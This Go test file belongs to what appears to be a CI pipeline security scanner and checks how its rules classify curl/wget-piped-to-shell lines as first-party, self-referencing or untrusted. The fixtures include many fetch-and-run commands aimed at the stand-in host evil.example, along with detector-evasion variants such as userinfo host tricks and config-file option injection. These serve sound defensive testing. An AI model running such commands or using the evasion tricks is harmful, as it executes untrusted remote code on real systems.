package policies_test

import (
	"context"
	"testing"

	opaengine "github.com/getplumber/plumber/internal/engine/opa"
	"github.com/getplumber/plumber/internal/ir"
	"github.com/getplumber/plumber/policies"
)

// findingData returns the single finding of code among findings (the
// test fails if there is not exactly one), for asserting on its Data.
func findingOfCode(t *testing.T, findings []opaengine.Finding, code string) *opaengine.Finding {
	t.Helper()
	var hits []opaengine.Finding
	for _, f := range findings {
		if f.Code == code {
			hits = append(hits, f)
		}
	}
	if len(hits) != 1 {
		t.Fatalf("expected exactly one %s finding, got %d: %+v", code, len(hits), hits)
	}
	return &hits[0]
}

func hasCode(findings []opaengine.Finding, code string) bool {
	for _, f := range findings {
		if f.Code == code {
			return true
		}
	}
	return false
}

func newEngine(t *testing.T) *opaengine.Engine {
	t.Helper()
	engine := opaengine.New()
	if err := engine.LoadFromFSFiltered(policies.FS, nil); err != nil {
		t.Fatalf("load embedded policies: %v", err)
	}
	return engine
}

// TestIssue411_FirstPartyScript pins the firstParty data field a
// curl/wget fetch of a first-party domain gains: the control still
// fails (an unverified script is still a finding) but the finding says
// the fetch is first-party, so the path actor can read it as an
// insider rather than an outsider.
func TestIssue411_FirstPartyScript(t *testing.T) {
	engine := newEngine(t)

	pipeline := &ir.NormalizedPipeline{
		ProjectPath: "ClickHouse/x",
		Jobs: []ir.Job{{
			Name:    "build",
			Scripts: []string{`curl https://clickhouse.com/ | sh`},
		}},
	}
	findings, err := evaluateStrict(engine, context.Background(), pipeline, nil)
	if err != nil {
		t.Fatalf("evaluate: %v", err)
	}
	f := findingOfCode(t, findings, "ISSUE-411")
	if fp, _ := f.Data["firstParty"].(bool); !fp {
		t.Fatalf("expected firstParty=true on the ISSUE-411 finding, got Data=%+v", f.Data)
	}
}

// TestIssue411_SelfReferenceImmutable_SuppressesTheFinding pins that a
// self-reference pinned to the exact commit the workflow runs at (a
// literal ${{ github.sha }}) is no entry at all: nobody but whoever
// already committed here can ever change it, so ISSUE-411 never fires.
func TestIssue411_SelfReferenceImmutable_SuppressesTheFinding(t *testing.T) {
	engine := newEngine(t)

	pipeline := &ir.NormalizedPipeline{
		ProjectPath: "me/repo",
		Jobs: []ir.Job{{
			Name:    "build",
			Scripts: []string{`curl https://raw.githubusercontent.com/me/repo/${{ github.sha }}/install.sh | sh`},
		}},
	}
	findings, err := evaluateStrict(engine, context.Background(), pipeline, nil)
	if err != nil {
		t.Fatalf("evaluate: %v", err)
	}
	if hasCode(findings, "ISSUE-411") {
		t.Fatalf("an immutable self-reference must anchor no ISSUE-411 finding, got %+v", findings)
	}
}

// TestIssue411_SelfReferenceOnBranch_IsFirstPartyNotSuppressed pins the
// other half of the same rule: the scanned repository's own content
// on a BRANCH or tag (not pinned to the commit the workflow runs at)
// is not suppressed, it is a first-party (insider) source instead of
// an outsider's, read the same way as any other first-party fetch.
func TestIssue411_SelfReferenceOnBranch_IsFirstPartyNotSuppressed(t *testing.T) {
	engine := newEngine(t)

	pipeline := &ir.NormalizedPipeline{
		ProjectPath: "me/repo",
		Jobs: []ir.Job{{
			Name:    "build",
			Scripts: []string{`curl https://raw.githubusercontent.com/me/repo/main/install.sh | sh`},
		}},
	}
	findings, err := evaluateStrict(engine, context.Background(), pipeline, nil)
	if err != nil {
		t.Fatalf("evaluate: %v", err)
	}
	f := findingOfCode(t, findings, "ISSUE-411")
	if fp, _ := f.Data["firstParty"].(bool); !fp {
		t.Fatalf("expected firstParty=true on a branch self-reference, got Data=%+v", f.Data)
	}
}

// TestIssue411_MultipleUrlsOnOneLine_NotAllSelfReference pins that
// every fetched URL on the line must be a self-reference (or
// first-party) for the finding to be suppressed or read as
// first-party: a line that pipes one URL to a shell and separately
// fetches a self-referencing URL to a file is not "every URL",
// because the capture used to stop at the first URL's internal space
// (inside an unresolved ${{ ... }} expression) and swallow the second
// URL whole.
func TestIssue411_MultipleUrlsOnOneLine_NotAllSelfReference(t *testing.T) {
	engine := newEngine(t)
	selfURL := "https://raw.githubusercontent.com/me/repo/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa/a.sh"
	cases := []string{
		"curl -o a.sh " + selfURL + " && curl https://evil.example/i.sh | sh",
		"curl " + selfURL + " https://evil.example/i.sh | sh",
	}
	for _, line := range cases {
		t.Run(line, func(t *testing.T) {
			pipeline := &ir.NormalizedPipeline{
				ProjectPath: "me/repo",
				Jobs:        []ir.Job{{Name: "build", Scripts: []string{line}}},
			}
			findings, err := evaluateStrict(engine, context.Background(), pipeline, nil)
			if err != nil {
				t.Fatalf("evaluate: %v", err)
			}
			f := findingOfCode(t, findings, "ISSUE-411")
			if fp, _ := f.Data["firstParty"].(bool); fp {
				t.Fatalf("firstParty must be false when not every fetched URL is first-party, got Data=%+v", f.Data)
			}
		})
	}
}

// TestIssue411_UserinfoBypass_IsNotFirstParty pins that a URL's host is
// parsed properly (userinfo before an "@" dropped, not read as part of
// the host): "https://me.com:@evil.example/i.sh" must not read as
// first-party for owner "me" just because "me.com" is immediately
// followed by a colon.
func TestIssue411_UserinfoBypass_IsNotFirstParty(t *testing.T) {
	engine := newEngine(t)
	pipeline := &ir.NormalizedPipeline{
		ProjectPath: "me/repo",
		Jobs:        []ir.Job{{Name: "build", Scripts: []string{"curl https://me.com:@evil.example/i.sh | sh"}}},
	}
	findings, err := evaluateStrict(engine, context.Background(), pipeline, nil)
	if err != nil {
		t.Fatalf("evaluate: %v", err)
	}
	f := findingOfCode(t, findings, "ISSUE-411")
	if fp, _ := f.Data["firstParty"].(bool); fp {
		t.Fatalf("a userinfo prefix must not grant first-party status to the real host, got Data=%+v", f.Data)
	}
}

// TestIssue411_SecondFetchCommandEscapesViaVariableOrSchemeless (fix
// round 2, item 3) pins that EVERY fetch COMMAND on the line must
// carry a literal URL that passes the check, not just every literal
// URL that happens to be extractable: a second curl/wget command
// whose target is a shell variable, or a scheme-less host, has no
// literal URL at all, and must fail the check rather than being
// silently skipped (which `every url in urls` alone cannot catch,
// since a set of extracted URLs never records how many commands
// escaped it without contributing anything).
func TestIssue411_SecondFetchCommandEscapesViaVariableOrSchemeless(t *testing.T) {
	engine := newEngine(t)
	selfURL := "https://raw.githubusercontent.com/me/repo/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa/a.sh"
	cases := []string{
		"curl -o a.sh " + selfURL + ` && curl -fsSL "$INSTALL_URL" | sh`,
		"curl -o a.sh " + selfURL + " && curl -fsSL evil.example/main/i.sh | sh",
	}
	for _, line := range cases {
		t.Run(line, func(t *testing.T) {
			pipeline := &ir.NormalizedPipeline{
				ProjectPath: "me/repo",
				Jobs:        []ir.Job{{Name: "build", Scripts: []string{line}}},
			}
			findings, err := evaluateStrict(engine, context.Background(), pipeline, nil)
			if err != nil {
				t.Fatalf("evaluate: %v", err)
			}
			f := findingOfCode(t, findings, "ISSUE-411")
			if fp, _ := f.Data["firstParty"].(bool); fp {
				t.Fatalf("firstParty must be false: a second fetch command with no literal URL escapes the check, got Data=%+v", f.Data)
			}
		})
	}
}

// TestIssue411_FirstPartyCommandThenVariableEscape mirrors the same
// rule the other way round: a first command that IS first-party does
// not make a second, variable-targeted command first-party too.
func TestIssue411_FirstPartyCommandThenVariableEscape(t *testing.T) {
	engine := newEngine(t)
	pipeline := &ir.NormalizedPipeline{
		ProjectPath: "me/repo",
		Jobs:        []ir.Job{{Name: "build", Scripts: []string{`curl https://me.com/x -o a; curl "$U" | sh`}}},
	}
	findings, err := evaluateStrict(engine, context.Background(), pipeline, nil)
	if err != nil {
		t.Fatalf("evaluate: %v", err)
	}
	f := findingOfCode(t, findings, "ISSUE-411")
	if fp, _ := f.Data["firstParty"].(bool); fp {
		t.Fatalf("firstParty must be false: the second command's URL is a variable, got Data=%+v", f.Data)
	}
}

// TestIssue411_SecondArgumentOfOneCommandEscapesViaVariableOrSchemeless
// (fix round 3, item 2) pins that EVERY non-option argument of a
// SINGLE curl/wget command must itself be a literal URL, not just
// every URL some regex happened to find in the command: a second,
// non-option argument that is scheme-less or a shell variable must
// fail the check, the same as if it were a separate command (fix
// round 2, item 3, which this closes the remaining gap in).
func TestIssue411_SecondArgumentOfOneCommandEscapesViaVariableOrSchemeless(t *testing.T) {
	engine := newEngine(t)
	selfURL := "https://raw.githubusercontent.com/me/repo/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa/a.sh"
	cases := []string{
		"curl " + selfURL + " evil.example/main/i.sh | sh",
		"curl " + selfURL + ` "$EXTRA" | sh`,
	}
	for _, line := range cases {
		t.Run(line, func(t *testing.T) {
			pipeline := &ir.NormalizedPipeline{
				ProjectPath: "me/repo",
				Jobs:        []ir.Job{{Name: "build", Scripts: []string{line}}},
			}
			findings, err := evaluateStrict(engine, context.Background(), pipeline, nil)
			if err != nil {
				t.Fatalf("evaluate: %v", err)
			}
			f := findingOfCode(t, findings, "ISSUE-411")
			if fp, _ := f.Data["firstParty"].(bool); fp {
				t.Fatalf("firstParty must be false: a second argument with no literal URL escapes the check, got Data=%+v", f.Data)
			}
		})
	}
}

// TestIssue411_SecondArgumentNotFirstParty mirrors the same rule for
// first-party: a second, non-first-party (or non-URL) argument on the
// SAME command must stop the line from reading as first-party.
func TestIssue411_SecondArgumentNotFirstParty(t *testing.T) {
	engine := newEngine(t)
	pipeline := &ir.NormalizedPipeline{
		ProjectPath: "me/repo",
		Jobs:        []ir.Job{{Name: "build", Scripts: []string{"curl https://me.com/i.sh evil.example/x | sh"}}},
	}
	findings, err := evaluateStrict(engine, context.Background(), pipeline, nil)
	if err != nil {
		t.Fatalf("evaluate: %v", err)
	}
	f := findingOfCode(t, findings, "ISSUE-411")
	if fp, _ := f.Data["firstParty"].(bool); fp {
		t.Fatalf("firstParty must be false: the second argument is not a first-party URL, got Data=%+v", f.Data)
	}
}

// TestIssue411_OptionValuesAreNotFetchTargets pins the other half of
// the same tokenization: an option's own VALUE (-o <file>, -H
// <header>, and the like) is never a fetch target, so a command that
// carries one alongside its real, first-party URL argument must still
// read as first-party.
func TestIssue411_OptionValuesAreNotFetchTargets(t *testing.T) {
	engine := newEngine(t)
	pipeline := &ir.NormalizedPipeline{
		ProjectPath: "me/repo",
		Jobs: []ir.Job{{Name: "build", Scripts: []string{
			`curl -H "Authorization: token x" -o install.sh https://me.com/install.sh | sh`,
		}}},
	}
	findings, err := evaluateStrict(engine, context.Background(), pipeline, nil)
	if err != nil {
		t.Fatalf("evaluate: %v", err)
	}
	f := findingOfCode(t, findings, "ISSUE-411")
	if fp, _ := f.Data["firstParty"].(bool); !fp {
		t.Fatalf("firstParty must be true: -H's value and -o's value are not fetch targets, got Data=%+v", f.Data)
	}
}

// TestIssue701_ArchivedTag pins the archivedTag data field: an action
// repository that is archived can never have its tag retargeted, so
// the reference is immutable in practice even though it is not pinned
// to a commit SHA.
func TestIssue701_ArchivedTag(t *testing.T) {
	engine := newEngine(t)

	pipeline := &ir.NormalizedPipeline{
		ProjectPath: "me/repo",
		Jobs: []ir.Job{{
			Name: "build",
			Uses: []ir.Action{{
				Uses: "ancient/frozen-action@v1",
				Metadata: &ir.ActionMetadata{
					RepoArchived: true,
					RefKind:      "tag",
				},
			}},
		}},
	}
	cfg := map[string]any{"actionsMustBePinnedByCommitSha": true}
	findings, err := evaluateStrict(engine, context.Background(), pipeline, cfg)
	if err != nil {
		t.Fatalf("evaluate: %v", err)
	}
	f := findingOfCode(t, findings, "ISSUE-701")
	if at, _ := f.Data["archivedTag"].(bool); !at {
		t.Fatalf("expected archivedTag=true on the ISSUE-701 finding, got Data=%+v", f.Data)
	}
}

// TestIssue701_RedirectedOwner pins the redirectedOwner data field: an
// action whose repository redirected to another owner (a rename or an
// organisation transfer) carries that owner, so a sibling-organisation
// check can read who can actually change the code.
func TestIssue701_RedirectedOwner(t *testing.T) {
	engine := newEngine(t)

	pipeline := &ir.NormalizedPipeline{
		ProjectPath: "cloudflare/project",
		Jobs: []ir.Job{{
			Name: "build",
			Uses: []ir.Action{{
				Uses: "ask-bonk/ask-bonk@main",
				Metadata: &ir.ActionMetadata{
					RedirectedOwner: "Cloudflare-Studio",
				},
			}},
		}},
	}
	cfg := map[string]any{"actionsMustBePinnedByCommitSha": true}
	findings, err := evaluateStrict(engine, context.Background(), pipeline, cfg)
	if err != nil {
		t.Fatalf("evaluate: %v", err)
	}
	f := findingOfCode(t, findings, "ISSUE-701")
	if owner, _ := f.Data["redirectedOwner"].(string); owner != "Cloudflare-Studio" {
		t.Fatalf("redirectedOwner = %q, want %q (Data=%+v)", owner, "Cloudflare-Studio", f.Data)
	}
}

// TestIssue714_DownloadGuardAndRunsOn pins that a guarded, SHA-pinned
// action's mutable-remote-exec finding carries the guarded tool and the
// job's own runs-on facts, so the path assembly rules (control/trust.go)
// can decide whether the guard actually fires on this job's runner.
func TestIssue714_DownloadGuardAndRunsOn(t *testing.T) {
	engine := newEngine(t)

	pipeline := &ir.NormalizedPipeline{
		ProjectPath: "me/repo",
		Jobs: []ir.Job{{
			Name:   "build",
			RunsOn: []string{"ubuntu-latest"},
			Uses: []ir.Action{{
				Uses: "dtolnay/rust-toolchain@" + "0000000000000000000000000000000000000000",
				Metadata: &ir.ActionMetadata{
					MutableRemoteExec: &ir.MutableRemoteExec{
						Tier:          "exec",
						URL:           "https://sh.rustup.rs",
						File:          "action.yml",
						DownloadGuard: "rustup",
					},
				},
			}},
		}},
	}
	findings, err := evaluateStrict(engine, context.Background(), pipeline, nil)
	if err != nil {
		t.Fatalf("evaluate: %v", err)
	}
	f := findingOfCode(t, findings, "ISSUE-714")
	if guard, _ := f.Data["downloadGuard"].(string); guard != "rustup" {
		t.Fatalf("downloadGuard = %q, want %q (Data=%+v)", guard, "rustup", f.Data)
	}
	runsOn, _ := f.Data["runsOn"].([]any)
	if len(runsOn) != 1 || runsOn[0] != "ubuntu-latest" {
		t.Fatalf("runsOn = %+v, want [ubuntu-latest]", f.Data["runsOn"])
	}
}

// TestIssue714_NoGuardNoVerified_KeepsTheOriginalShape pins that an
// ordinary mutable-remote-exec finding (no guard, not verified) carries
// neither new key: the additive fields apply only where a trust signal
// actually exists.
func TestIssue714_NoGuardNoVerified_KeepsTheOriginalShape(t *testing.T) {
	engine := newEngine(t)

	pipeline := &ir.NormalizedPipeline{
		ProjectPath: "me/repo",
		Jobs: []ir.Job{{
			Name:   "build",
			RunsOn: []string{"ubuntu-latest"},
			Uses: []ir.Action{{
				Uses: "anchore/scan-action@" + "1111111111111111111111111111111111111111",
				Metadata: &ir.ActionMetadata{
					MutableRemoteExec: &ir.MutableRemoteExec{
						Tier: "exec",
						URL:  "https://raw.githubusercontent.com/anchore/grype/main/install.sh",
						File: "action.yml",
					},
				},
			}},
		}},
	}
	findings, err := evaluateStrict(engine, context.Background(), pipeline, nil)
	if err != nil {
		t.Fatalf("evaluate: %v", err)
	}
	f := findingOfCode(t, findings, "ISSUE-714")
	if _, ok := f.Data["downloadGuard"]; ok {
		t.Fatalf("downloadGuard must be absent, got Data=%+v", f.Data)
	}
	if _, ok := f.Data["downloadVerified"]; ok {
		t.Fatalf("downloadVerified must be absent, got Data=%+v", f.Data)
	}
}

// TestIssue714_FetchUrl pins that the ISSUE-714 finding carries the
// fetch's own URL (fetchUrl): control/trust.go's download-host actor
// ("if <host> is compromised") reads the host off it.
func TestIssue714_FetchUrl(t *testing.T) {
	engine := newEngine(t)

	pipeline := &ir.NormalizedPipeline{
		ProjectPath: "me/repo",
		Jobs: []ir.Job{{
			Name: "build",
			Uses: []ir.Action{{
				Uses: "anchore/scan-action@" + "1111111111111111111111111111111111111111",
				Metadata: &ir.ActionMetadata{
					MutableRemoteExec: &ir.MutableRemoteExec{
						Tier: "exec",
						URL:  "https://raw.githubusercontent.com/anchore/grype/main/install.sh",
						File: "action.yml",
					},
				},
			}},
		}},
	}
	findings, err := evaluateStrict(engine, context.Background(), pipeline, nil)
	if err != nil {
		t.Fatalf("evaluate: %v", err)
	}
	f := findingOfCode(t, findings, "ISSUE-714")
	want := "https://raw.githubusercontent.com/anchore/grype/main/install.sh"
	if url, _ := f.Data["fetchUrl"].(string); url != want {
		t.Fatalf("fetchUrl = %q, want %q (Data=%+v)", url, want, f.Data)
	}
}

// TestIssue714_FetchUrl_ExtractedFromPipeSnippet (fix round 2, item 4)
// pins that fetchUrl is a clean URL even when ir.MutableRemoteExec.URL
// itself is the whole matched command snippet (the pipe-to-shell
// shape github/action_source.go's scanStepFetches actually reports,
// e.g. "curl -sSf https://sh.rustup.rs | sh"), not just a case where
// it already happens to be a bare URL.
func TestIssue714_FetchUrl_ExtractedFromPipeSnippet(t *testing.T) {
	engine := newEngine(t)

	pipeline := &ir.NormalizedPipeline{
		ProjectPath: "me/repo",
		Jobs: []ir.Job{{
			Name: "build",
			Uses: []ir.Action{{
				Uses: "dtolnay/rust-toolchain@" + "0000000000000000000000000000000000000000",
				Metadata: &ir.ActionMetadata{
					MutableRemoteExec: &ir.MutableRemoteExec{
						Tier: "exec",
						URL:  "curl -sSf https://sh.rustup.rs | sh",
						File: "action.yml",
					},
				},
			}},
		}},
	}
	findings, err := evaluateStrict(engine, context.Background(), pipeline, nil)
	if err != nil {
		t.Fatalf("evaluate: %v", err)
	}
	f := findingOfCode(t, findings, "ISSUE-714")
	want := "https://sh.rustup.rs"
	if url, _ := f.Data["fetchUrl"].(string); url != want {
		t.Fatalf("fetchUrl = %q, want %q (Data=%+v)", url, want, f.Data)
	}
}

// TestIssue411_ValueTakingOptionsPerTool pins that an option's own value
// is never a fetch target, read per tool: `--proto '=https'` (the
// common rustup shape) and wget's `-O <file>` take a value, curl's
// `-O` does not.
func TestIssue411_ValueTakingOptionsPerTool(t *testing.T) {
	engine := newEngine(t)
	for _, script := range []string{
		`curl --proto '=https' --tlsv1.2 -sSf https://me.com/i.sh | sh`,
		`wget -O i.sh https://me.com/i.sh && sh i.sh`,
		`wget --output-document i.sh https://me.com/i.sh && sh i.sh`,
		`curl -O https://me.com/i.sh && sh i.sh`,
		`curl --cacert ca.pem --resolve me.com:443:1.2.3.4 -m 30 -x proxy:3128 https://me.com/i.sh | sh`,
	} {
		t.Run(script, func(t *testing.T) {
			pipeline := &ir.NormalizedPipeline{
				ProjectPath: "me/repo",
				Jobs:        []ir.Job{{Name: "build", Scripts: []string{script}}},
			}
			findings, err := evaluateStrict(engine, context.Background(), pipeline, nil)
			if err != nil {
				t.Fatalf("evaluate: %v", err)
			}
			f := findingOfCode(t, findings, "ISSUE-411")
			if fp, _ := f.Data["firstParty"].(bool); !fp {
				t.Fatalf("firstParty must be true: the option values are not fetch targets, got Data=%+v", f.Data)
			}
		})
	}
}

// TestIssue411_OptionThatIsAFlagForThisTool_DoesNotHideATarget pins
// the dangerous direction of the same rule: an option that takes a
// value for one tool but is a plain flag for the other (wget's `-H`
// spans hosts, it takes no value) must never swallow a real fetch
// target, or a non-self-referencing URL hides behind it and the line
// reads as an immutable self-reference.
func TestIssue411_OptionThatIsAFlagForThisTool_DoesNotHideATarget(t *testing.T) {
	engine := newEngine(t)
	pipeline := &ir.NormalizedPipeline{
		ProjectPath: "me/repo",
		Jobs: []ir.Job{{Name: "build", Scripts: []string{
			`wget -qO- -H https://evil.example/i.sh https://raw.githubusercontent.com/me/repo/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa/i.sh | sh`,
		}}},
	}
	findings, err := evaluateStrict(engine, context.Background(), pipeline, nil)
	if err != nil {
		t.Fatalf("evaluate: %v", err)
	}
	f := findingOfCode(t, findings, "ISSUE-411")
	if fp, _ := f.Data["firstParty"].(bool); fp {
		t.Fatalf("firstParty must be false: evil.example is a fetch target of wget, got Data=%+v", f.Data)
	}
}

// TestIssue411_OptionThatInjectsTargets_FailsTheCheck pins that an
// option whose value can bring in fetch targets of its own (a curl
// config file, a wget input list or startup command) makes the whole
// command unprovable: never a self-reference, never first-party.
func TestIssue411_OptionThatInjectsTargets_FailsTheCheck(t *testing.T) {
	engine := newEngine(t)
	const self = "https://raw.githubusercontent.com/me/repo/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa/i.sh"
	for _, script := range []string{
		"curl -K evil.cfg " + self + " | sh",
		"curl --config evil.cfg " + self + " | sh",
		"curl --config=evil.cfg " + self + " | sh",
		"curl -fsSLK evil.cfg " + self + " | sh",
		"curl --variable url@evil.txt " + self + " | sh",
		"curl --expand-url {{url}} " + self + " | sh",
		"wget -i list.txt -qO- " + self + " | sh",
		"wget --input-file=list.txt -qO- " + self + " | sh",
		"wget -e robots=off -qO- " + self + " | sh",
		"wget --execute robots=off -qO- " + self + " | sh",
		"wget --config evil.rc -qO- " + self + " | sh",
	} {
		t.Run(script, func(t *testing.T) {
			pipeline := &ir.NormalizedPipeline{
				ProjectPath: "me/repo",
				Jobs:        []ir.Job{{Name: "build", Scripts: []string{script}}},
			}
			findings, err := evaluateStrict(engine, context.Background(), pipeline, nil)
			if err != nil {
				t.Fatalf("evaluate: %v", err)
			}
			f := findingOfCode(t, findings, "ISSUE-411")
			if fp, _ := f.Data["firstParty"].(bool); fp {
				t.Fatalf("firstParty must be false: the option can inject fetch targets, got Data=%+v", f.Data)
			}
		})
	}
}

// TestIssue411_SelfReferenceInsideShellCSubstitution pins that a fetch
// inside a quoted command substitution handed to `sh -c` is read as a
// command of its own: an immutable self-reference there is no entry,
// any other source stays a finding.
func TestIssue411_SelfReferenceInsideShellCSubstitution(t *testing.T) {
	engine := newEngine(t)
	run := func(script string) []opaengine.Finding {
		t.Helper()
		pipeline := &ir.NormalizedPipeline{
			ProjectPath: "me/repo",
			Jobs:        []ir.Job{{Name: "build", Scripts: []string{script}}},
		}
		findings, err := evaluateStrict(engine, context.Background(), pipeline, nil)
		if err != nil {
			t.Fatalf("evaluate: %v", err)
		}
		return findings
	}
	self := `sh -c "$(curl -fsSL https://raw.githubusercontent.com/me/repo/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa/install.sh)"`
	if findings := run(self); hasCode(findings, "ISSUE-411") {
		t.Fatalf("an immutable self-reference inside sh -c \"$(...)\" must anchor no ISSUE-411 finding, got %+v", findings)
	}
	evil := `sh -c "$(curl -fsSL https://evil.example/i.sh)"`
	if findings := run(evil); !hasCode(findings, "ISSUE-411") {
		t.Fatalf("a non-self-referencing fetch inside sh -c \"$(...)\" must stay an ISSUE-411 finding, got %+v", findings)
	}
	bt := "sh -c \"`curl -fsSL https://raw.githubusercontent.com/me/repo/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa/install.sh`\""
	if findings := run(bt); hasCode(findings, "ISSUE-411") {
		t.Fatalf("an immutable self-reference inside a backtick substitution must anchor no ISSUE-411 finding, got %+v", findings)
	}
	bare := `eval $(curl -fsSL https://raw.githubusercontent.com/me/repo/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa/install.sh)`
	if findings := run(bare); hasCode(findings, "ISSUE-411") {
		t.Fatalf("an immutable self-reference inside a bare substitution must anchor no ISSUE-411 finding, got %+v", findings)
	}
	bareEvil := `eval $(curl -fsSL https://evil.example/i.sh)`
	if findings := run(bareEvil); !hasCode(findings, "ISSUE-411") {
		t.Fatalf("a non-self-referencing fetch inside a bare substitution must stay an ISSUE-411 finding, got %+v", findings)
	}
	mixed := `sh -c "$(curl -fsSL https://raw.githubusercontent.com/me/repo/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa/install.sh)" && curl https://evil.example/i.sh | sh`
	if findings := run(mixed); !hasCode(findings, "ISSUE-411") {
		t.Fatalf("a second, non-self-referencing fetch on the line must keep the ISSUE-411 finding, got %+v", findings)
	}
	nested := `sh -c "$(curl -fsSL https://raw.githubusercontent.com/me/repo/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa/install.sh "$(curl -fsSL https://evil.example/x)")"`
	if findings := run(nested); !hasCode(findings, "ISSUE-411") {
		t.Fatalf("a fetch nested one level deeper must keep the ISSUE-411 finding, got %+v", findings)
	}
}
